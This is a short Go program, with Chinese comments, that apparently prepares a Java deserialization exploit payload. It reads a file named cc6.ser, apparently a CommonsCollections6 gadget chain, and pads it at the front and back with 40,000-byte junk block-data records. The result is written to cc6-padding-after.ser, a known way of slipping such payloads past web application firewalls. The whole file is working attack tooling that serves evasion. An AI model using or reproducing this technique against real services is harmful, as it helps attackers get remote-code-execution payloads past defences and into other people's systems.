package main

import (
	"io/ioutil"
	"log"
	"strings"

	"github.com/phith0n/zkar/serz"
)

func main() {
	// 填写 cc6.ser 的路径
	data, _ := ioutil.ReadFile("cc6.ser")
	serialization, err := serz.FromBytes(data)
	if err != nil {
		log.Fatal("parse error")
	}
	// 4w个a
	var blockData = &serz.TCContent{
		Flag: serz.JAVA_TC_BLOCKDATALONG,
		BlockData: &serz.TCBlockData{
			Data: []byte(strings.Repeat("a", 40000)),
		},
	}
	serialization.Contents = append([]*serz.TCContent{blockData}, serialization.Contents...)

	// 脏数据添加到尾部
	serialization.Contents = append(serialization.Contents, blockData)
	ioutil.WriteFile("cc6-padding-after.ser", serialization.ToBytes(), 0o755)
}
